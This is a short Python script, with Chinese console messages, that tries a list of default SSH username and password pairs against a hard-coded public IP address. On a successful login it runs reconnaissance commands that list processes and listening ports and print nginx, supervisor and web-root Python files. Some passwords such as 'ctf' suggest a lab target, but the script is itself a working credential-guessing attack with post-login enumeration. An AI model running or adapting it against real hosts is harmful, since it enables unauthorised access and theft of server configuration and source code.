import paramiko
import socket

HOST = "119.29.238.216"
PORT = 22

credentials = [
    ("root", "root"),
    ("root", "123456"),
    ("root", "password"),
    ("root", "admin"),
    ("root", "ctf"),
    ("root", "term3lab"),
    ("root", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "root"),
    ("admin", "ctf"),
    ("baota", "baota"),
    ("bt", "bt"),
    ("www", "www"),
    ("user", "user"),
    ("root", "1q2w3e4r"),
    ("root", "admin123"),
    ("root", "Aa123456"),
]

def ssh_connect(username, password, timeout=10):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(HOST, port=PORT, username=username, password=password, timeout=timeout)
        print(f"✅ SSH登录成功: {username}/{password}")
        
        commands = [
            "whoami",
            "hostname",
            "pwd",
            "ls -la",
            "ps aux | grep python",
            "ps aux | grep nginx",
            "ps aux | grep uwsgi",
            "ps aux | grep gunicorn",
            "netstat -tlnp 2>/dev/null || ss -tlnp",
            "cat /etc/nginx/sites-enabled/default 2>/dev/null || cat /etc/nginx/conf.d/*.conf 2>/dev/null",
            "ls /www/wwwroot/ 2>/dev/null",
            "ls /www/wwwroot/default/ 2>/dev/null",
            "cat /www/wwwroot/default/*.py 2>/dev/null",
            "ls /etc/supervisor/conf.d/ 2>/dev/null",
            "cat /etc/supervisor/conf.d/*.conf 2>/dev/null",
            "ls /etc/systemd/system/*.service 2>/dev/null",
            "systemctl list-units --type=service 2>/dev/null | grep -i running",
        ]
        
        for cmd in commands:
            stdin, stdout, stderr = ssh.exec_command(cmd, timeout=15)
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            
            if output or error:
                print(f"\n--- {cmd} ---")
                if output:
                    print(output)
                if error:
                    print(f"Error: {error}")
        
        ssh.close()
        return True
        
    except paramiko.AuthenticationException:
        print(f"❌ 认证失败: {username}/{password}")
        return False
    except paramiko.SSHException as e:
        print(f"❌ SSH异常: {username} - {e}")
        return False
    except socket.timeout:
        print(f"❌ 超时: {username}/{password}")
        return False
    except Exception as e:
        print(f"❌ 错误: {username} - {e}")
        return False

def main():
    print("*"*70)
    print("  SSH服务器检查")
    print(f"  目标: {HOST}:{PORT}")
    print("*"*70)
    
    print("\n  尝试SSH登录...")
    
    for username, password in credentials:
        if ssh_connect(username, password):
            print("\n" + "="*70)
            print("🎉 SSH登录成功!")
            print("="*70)
            return
    
    print("\n" + "="*70)
    print("❌ 所有凭证尝试失败")
    print("="*70)
    print("\n  建议:")
    print("     1. 检查宝塔面板获取SSH密码")
    print("     2. 使用宝塔面板终端登录")
    print("     3. 联系服务器管理员获取凭证")

if __name__ == "__main__":
    main()